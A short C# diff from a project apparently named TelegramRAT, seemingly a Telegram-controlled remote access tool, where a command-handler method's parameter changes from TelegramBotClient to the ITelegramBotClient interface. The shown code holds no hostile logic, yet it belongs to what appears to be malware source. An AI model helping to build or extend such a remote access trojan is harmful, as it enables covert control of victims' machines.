@@ -4,7 +4,7 @@ namespace TelegramRAT.Commands;
 
 public static class BotCommandExtensions
 {
-    public static async Task ExecuteStartAsync(this BotCommand cmd, BotCommandModel model, TelegramBotClient bot)
+    public static async Task ExecuteStartAsync(this BotCommand cmd, BotCommandModel model, ITelegramBotClient bot)
     {
         var botCommands = new List<Telegram.Bot.Types.BotCommand>
         {
